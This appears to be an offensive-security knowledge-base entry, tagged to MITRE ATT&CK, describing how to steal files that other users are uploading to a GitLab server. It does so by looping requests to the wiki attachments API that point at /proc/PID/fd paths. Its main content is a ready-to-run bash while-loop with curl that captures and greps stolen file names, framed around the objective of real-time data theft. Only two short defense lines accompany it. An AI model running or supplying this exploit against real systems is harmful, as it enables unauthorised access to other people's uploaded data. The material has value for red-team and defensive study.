---
tags:
  - data-theft
  - proc-fs
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/echo]]'
  - '[[tools/sudo]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/create-test-file-git-owned]]'
  - '[[commands/curl-nuget-upload-bypass]]'
  - '[[commands/create-test-file-root-owned]]'
  - '[[commands/curl-wiki-attachments-read]]'
  - '[[commands/curl-pid-validation-19601]]'
  - '[[commands/curl-pid-validation-19603]]'
  - '[[commands/loop-steal-inflight-files]]'
  - '[[commands/create-test-file-hello]]'
  - '[[commands/create-dummy-file-unused]]'
  - '[[commands/curl-group-import-pid-leak]]'
  - '[[commands/loop-probe-file-descriptors]]'
platforms:
  - Linux
techniques:
  - '[[Data from Local System]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 733c7aed-31c6-49a4-b06f-ccbdefc8b23c
created_at: '2025-12-11T06:10:15.416Z'
updated_at: '2025-12-11T06:10:15.416Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1005]]'
---
# Steal In-Flight Uploads via Proc FD Looping

## Summary

This procedure uses a loop to steal in-flight upload files by targeting /proc/PID/fd symlinks.

## Description

With a known PID, looping requests to file descriptors capture open tmp files during uploads, exposing sensitive data in transit.

## Requirements

1. Valid PID from prior discovery.
2. Timing to coincide with uploads.
3. API access.

## Defense

Defensive measures and detection strategies:

- Use secure upload handling without /proc exposure.
- Rate-limit API requests to prevent looping.

## Objectives

1. Capture open file descriptors.
2. Extract file names and contents.
3. Demonstrate real-time data theft.

## Instructions

### Step 1: Run Theft Loop

**Context**: Infinite loop to probe and grep for file names.

**Command** ([[commands/loop-steal-inflight-files]]):
```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

> Filters output for stolen file names.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Local System]]

### Sub-Techniques



## Commands Used

- [[commands/loop-steal-inflight-files]]

## Tools Used

- [[tools/curl]]

## Tags

- [[data-theft]]
- [[proc-fs]]
